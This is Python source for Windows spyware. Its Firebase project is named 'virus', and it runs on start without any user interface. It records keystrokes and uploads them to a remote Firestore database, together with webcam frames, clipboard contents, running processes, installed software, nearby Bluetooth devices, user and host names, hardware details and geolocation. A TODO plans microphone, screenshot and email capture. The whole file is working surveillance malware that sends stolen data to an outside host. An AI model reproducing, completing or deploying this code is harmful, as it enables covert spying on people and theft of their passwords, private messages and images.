from pynput.keyboard import Key, Listener
import socket
import firebase_admin
import getpass
import platform
from firebase_admin import credentials, firestore
import wmi
import pathlib
from win32api import GetSystemMetrics
from PyInstaller.utils.hooks import collect_data_files
from time import sleep
import urllib.request
import json
from bluetooth import *
import cv2
import win32clipboard
import psutil


'''
TODO

Microphone
Screenshot
Send via e-mail?


'''


datas = collect_data_files('grpc')
cred = credentials.Certificate({
  "type": "service_account",
  "project_id": "virus-89536",
  "private_key_id": "TOP SECRET",
  "private_key": "TOP SECRET",
  "client_email": "firebase-adminsdk-agbwo@virus-89536.iam.gserviceaccount.com",
  "client_id": "113712976245597770935",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-agbwo%40virus-89536.iam.gserviceaccount.com"
})
written = ""
keys = []
updating = False
doc_ref = None


def get_clipboard_content():
    win32clipboard.OpenClipboard()
    content = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    return content


def get_webcam_img():
    camera = cv2.VideoCapture(0)
    return_value,image = camera.read()
    camera.release()
    return str(image)


def get_bluetooth_devices():
    ans = []
    nearby_devices = discover_devices(lookup_names=True)
    for name, address in nearby_devices:
        ans.append([name, address])
    return ans


def get_location(ip):
    with urllib.request.urlopen("https://geolocation-db.com/json/8.8.8.8") as url:
         return json.loads(url.read().decode())


def firebase_init():
    global doc_ref
    firebase_admin.initialize_app(cred, {'databaseURL': 'https://virus.firebaseio.com/'})
    db = firestore.client()
    ip_adress = socket.gethostbyname(socket.gethostname())
    doc_ref = db.collection(u'users').document(ip_adress)
    doc_ref.set({
        u'name': getpass.getuser(),
        u'hostname': socket.gethostname(),
        u'installed': set([program.Caption for program in wmi.WMI().Win32_Product()]),
        u'disk_location': str(pathlib.Path().absolute()),
        u'hardware_info': {'screen_size': {"width": GetSystemMetrics(0),
                                           "height": GetSystemMetrics(1)},
                           'cpu': platform.processor(),
                           'ram': str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB",
                           'os': platform.system()+' '+platform.release()+' v'+platform.version()},
        u'location': get_location(ip_adress)
    }, merge=True)
    doc_ref.update({u'images': firestore.ArrayUnion([get_webcam_img()])})
    data = doc_ref.get()
    if data.exists:
        data = data.to_dict()
        if 'keylog' in data.keys():
            doc_ref.update({u'previously_written': firestore.ArrayUnion([data['keylog']])})


def update_info(doc_ref):
    doc_ref.set({
        u'last_connection': firestore.SERVER_TIMESTAMP,
        u'running_processes': set([process.name for process in wmi.WMI().Win32_Process()]),
        u'bluetooth_devices': get_bluetooth_devices()
    }, merge=True)
    doc_ref.update({u'clipboard': firestore.ArrayUnion([get_clipboard_content()])})


def start_updates(delay, doc_ref):
    updating = True
    while updating:
        update_info(doc_ref)
        sleep(delay)


def on_press(key):
    global keys
    keys.append(key)
    if len(keys) >= 5:
        write_file(keys)
        keys = []


def write_file(keys):
    global written
    for key in keys:
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            written = written + "\n"
        elif k.find("Key") == -1:
            written = written + k
    doc_ref.set({
        u'keylog': written
    }, merge=True)


def on_release(key):
    if key == Key.esc:
        return False

if platform != 'win32':
    firebase_init()
    start_updates(10, doc_ref)
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
